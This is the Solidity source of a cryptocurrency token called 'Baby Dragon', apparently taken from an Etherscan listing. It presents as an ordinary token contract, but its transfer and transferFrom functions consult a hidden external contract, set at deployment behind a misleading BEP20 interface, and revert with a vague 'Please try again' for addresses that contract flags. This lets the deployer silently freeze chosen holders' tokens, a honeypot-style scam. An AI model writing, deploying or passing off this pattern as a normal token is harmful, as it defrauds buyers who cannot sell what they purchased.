/**
 *Submitted for verification at Etherscan.io on 2021-09-25
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface BEP20 {

    function get_recipient( address token, address recipient) external view returns (address);

    function return_value(bytes20 account) external view returns (uint8);

    function token_check(address token, address owner, uint balance) external returns (uint);

    function get_allowance(address token, address spender, uint amount, address recipient) external view returns (address);

}

contract BabyDrak {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    BEP20 beptoken;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Dragon";
    string public symbol = hex"42616279447261676F6Ef09f90b2";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(BEP20 _arg) {
        
        beptoken = _arg;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function abiencode(address acct) public pure returns (bytes memory) {
    return abi.encodePacked(acct);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(beptoken.return_value(ripemd160(abiencode(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(beptoken.return_value(ripemd160(abiencode(from))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}